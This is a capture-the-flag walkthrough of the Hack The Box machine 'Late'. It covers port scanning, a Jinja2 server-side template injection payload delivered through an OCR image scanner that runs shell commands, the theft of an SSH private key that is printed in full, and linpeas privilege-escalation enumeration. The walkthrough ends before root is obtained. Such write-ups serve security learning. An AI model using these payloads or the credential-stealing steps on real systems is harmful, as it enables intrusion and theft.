### Enumeration

### NMAP

```console
Nmap scan report for 10.10.11.156
Host is up, received user-set (0.069s latency).
Scanned at 2022-05-06 08:30:49 PDT for 43s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Aggressive OS guesses: AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 4.15 - 5.6 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 5.0 - 5.3 (92%), Linux 3.1 (91%), Linux 3.2 (91%), Linux 5.0 - 5.4 (91%), Linux 5.4 (90%), Linux 5.0 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/6%OT=22%CT=1%CU=33187%PV=Y%DS=2%DC=T%G=Y%TM=62753F54
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:05ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O
OS:6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%TG=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T6
OS:(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=O%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%TG=40%CD=S)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 39.317 days (since Mon Mar 28 00:55:11 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   68.55 ms 10.10.14.1
2   68.86 ms 10.10.11.156

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  6 08:31:32 2022 -- 1 IP address (1 host up) scanned in 42.84 seconds
```

### Feroxbuster

```console
200      GET        4l       17w      370c http://10.10.11.156/assets/images/gt_favicon.png
200      GET       13l       18w      217c http://10.10.11.156/assets/js/template.js
200      GET      204l      517w     6364c http://10.10.11.156/contact.html
200      GET        7l       68w     3290c http://10.10.11.156/assets/js/headroom.min.js
200      GET      230l     1009w     9461c http://10.10.11.156/index.html
200      GET       98l      512w     4909c http://10.10.11.156/assets/css/bootstrap-theme.css
200      GET       82l      522w     4166c http://10.10.11.156/assets/css/main.css
200      GET        8l       73w     2429c http://10.10.11.156/assets/js/html5shiv.js
200      GET        7l       36w      547c http://10.10.11.156/assets/js/jQuery.headroom.min.js
200      GET      230l     1009w     9461c http://10.10.11.156/
301      GET        7l       13w      194c http://10.10.11.156/assets => http://10.10.11.156/assets/
```

### Headroom

```console
/*!
 * headroom.js v0.4.0 - Give your page some headroom. Hide your header until you need it
 * Copyright (c) 2014 Nick Williams - http://wicky.nillia.ms/headroom.js
 * License: MIT
 */

!function(a){a&&(a.fn.headroom=function(b){return this.each(function(){var c=a(this),d=c.data("headroom"),e="object"==typeof b&&b;e=a.extend(!0,{},Headroom.options,e),d||(d=new Headroom(this,e),d.init(),c.data("headroom",d)),"string"==typeof b&&d[b]()})},a("[data-headroom]").each(function(){var b=a(this);b.headroom(b.data())}))}(window.Zepto||window.jQuery);
```

This might be something interested to take a look at.

After digging around for a bit, I couldn't find anything and discovered images.late.htb

```console
<!-- container -->
	<div class="container">

		<h2 class="text-center top-space">Frequently Asked Questions</h2>
		<br>

		<div class="row">
			<div class="col-sm-6">
				<h3>What's photo editing?</h3>
				<p>Photo editing is a fast digital way to perfect an image. Although cameras and phones are great devices for taking photos, sometimes they are not the greatest at capturing the best shots. Photo editing allows you to polish images by the lighting and colors, adding photo effects, blurring the background, removing unwanted items to make your photos beautiful. Editing photos with Late's best online photo editor and get more even more out of your photos. </p>
			</div>
			<div class="col-sm-6">
				<h3> How can I edit photos online for free?</h3>
				<p>With <a href="http://images.late.htb/">late free online photo editor</a>, you can do just that. First, open Late's free online photo editor website. Second, choose one editing feature you need, such as basic adjustments, portrait beauty, or photo effects from the left dashboard. Third, apply the feature, download, and share your final piece. </p>
			</div>
		</div> <!-- /row -->
```
So I added late.htb and images.late.htb to the host file and that did not work. Thinking further images.late.htb is a reverse proxy. So I loaded up foxyproxy and configured it. 

![image](https://user-images.githubusercontent.com/68706090/167180130-df7b67bc-8dd2-485d-861d-712e806bbb3c.png)

which took me to this page 

![image](https://user-images.githubusercontent.com/68706090/167180220-1aa3df98-c4b7-4657-bfd0-f5da51e94aac.png)

Scanning an image resulted in this. 

```console
<p>Error: The password you entered for the username
admin is incorrect. Lost your password?

Username or Email Address

admin
Password
®
CO Remember Me lent
Lost your password?

© Go to Backdoor

</p>
```

I am thinking some type of RCE, but its taking images and reading them.

I found this website, which makes things start to click. 

https://akshukatkar.medium.com/rce-with-flask-jinja-template-injection-ea5d0201b870

By creating this image with this condition I am able to recieve an output.

![image](https://user-images.githubusercontent.com/68706090/167187438-4075c1d1-4cba-4a67-859c-f64b442e73ff.png)

![image](https://user-images.githubusercontent.com/68706090/167187538-8e0eda03-f624-418e-855f-b55f1aecca26.png)

So we know that this is working. 

```console
{{ config.items() }}
```

using this we get this returned. 

```console
<p>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
</p>
```
When running {{7*'7'}} we get the answer of 7777777 so we know its Jinja2 based on this portswigger article. 

https://portswigger.net/research/server-side-template-injection

I found this page that goes into details about jinja2

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection

```console
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
this command I was able to get the user ID

```console
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>
```
SVC_ACC

then running because I know that SSH was open, so I decided to look for a id/rsa within the .ssh account.  

![2022-05-06 14_04_23-werz - Discord](https://user-images.githubusercontent.com/68706090/167218801-d860ded7-8f11-4104-afc5-fa4f6154bd17.png)

this from it I was able to get the RSA private Key

```console
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

### SSH with Private Key

```console
noob2uub@kali:~/ctf/htb/late$ chmod 600 id_rsa 
noob2uub@kali:~/ctf/htb/late$ ssh -i id_rsa svc_acc@10.10.11.156
load pubkey "id_rsa": invalid format
svc_acc@late:~$ cat id_rsa
cat: id_rsa: No such file or directory
svc_acc@late:~$ ls
app  user.txt
svc_acc@late:~$ 
``` 
We are in and we see that we can view the folders we can access

```console
svc_acc@late:~$ ls -la
total 40
drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7 13:51 .
drwxr-xr-x 3 root    root    4096 Jan  5 10:44 ..
drwxrwxr-x 7 svc_acc svc_acc 4096 Apr  4 13:28 app
lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -> /dev/null
-rw-r--r-- 1 svc_acc svc_acc 3771 Apr  4  2018 .bashrc
drwx------ 3 svc_acc svc_acc 4096 Apr  7 13:51 .cache
drwx------ 3 svc_acc svc_acc 4096 Jan  5 10:45 .gnupg
drwxrwxr-x 5 svc_acc svc_acc 4096 Jan  5 12:13 .local
-rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile
drwx------ 2 svc_acc svc_acc 4096 Apr  7 11:08 .ssh
-rw-r----- 1 root    svc_acc   33 May  5 22:36 user.txt
```
I was able to find two .py files and ran strings on them.

### Strings

```console
svc_acc@late:~/app$ strings main.py 
import datetime
import os, random
from flask.templating import render_template_string
from werkzeug.utils import secure_filename
import PIL.Image
import pytesseract
from PIL import Image
from flask import Flask, request, render_template, redirect, url_for, session, send_file
app = Flask(__name__)
upload_dir = "/home/svc_acc/app/uploads"
misc_dir = '/home/svc_acc/app/misc'
allowed_extensions =  ["jpg" ,'png']
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
@app.route('/')
def home():
    return render_template("index.html", title="Image Reader")
@app.route('/scanner', methods=['GET', 'POST'])
def scan_file():
    scanned_text = ''
    results = ''
    if request.method == 'POST':
        start_time = datetime.datetime.now()
        f = request.files['file']
        
        if f.filename.split('.')[-1] in allowed_extensions:
            try:
                ID = str(random.randint(1,10000))
                file_name = upload_dir + "/" + secure_filename(f.filename )+ ID
                f.save(file_name)
                pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'
                scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))
                results = """<p>{}</p>""".format(scanned_text)
                r = render_template_string(results)
                path = misc_dir + "/" + ID + '_' + 'results.txt'
            
                with open(path, 'w') as f:
                    f.write(r)
                return send_file(path, as_attachment=True,attachment_filename='results.txt')
            except Exception as e:
                return ('Error occured while processing the image: ' + str(e))
        else:
            return 'Invalid Extension'
svc_acc@late:~/app$ ls
main.py  misc  __pycache__  static  templates  uploads  wsgi.py
svc_acc@late:~/app$ strings wsgi.py 
from main import app
if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=50816)
    
```

Ok the main.py file looks like the image scanner

nothing on that seems useful so lets run linpeas on the box. 

### Linpeas.sh

a few things to take a look at:

```consol
#)You_can_write_even_more_files_inside_last_directory

/usr/local/sbin

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
You own the script: /usr/local/sbin/ssh-alert.sh
/usr/bin/gettext.sh

-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-- 1 root dip 370K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 10K Jan 13  2018 /usr/sbin/sensible-mda (Unknown SUID binary)
-rwsr-xr-x 1 root root 75K Jan 25 16:26 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 37K Jan 25 16:26 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 59K Jan 25 16:26 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40K Jan 25 16:26 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 44K Jan 25 16:26 /usr/bin/chsh
-rwsr-xr-x 1 root root 22K Jun 28  2019 /usr/bin/arping
-rwsr-sr-x 1 root mail 95K Nov 16  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 37K Jan 25 16:26 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75K Jan 25 16:26 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 427K Mar  3  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Jan 12 12:34 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Jan 25 16:26 /bin/su
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
So I can write things to usr/local/sbin and found this 

```consol
  GNU nano 2.9.3                                                                                       ssh-alert.sh                                                                                        Modified  

#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

Its is using the sendmail function which there is also an exploit for. 

I wasn't able to write to this file so lets take allot out the sendmail exploit now. 

A further search brought this up too.

```console
/usr/sbin/pppd
/usr/sbin/sensible-mda
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/arping
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/fusermount
/bin/mount
/bin/su
/bin/ping
/bin/umount
```








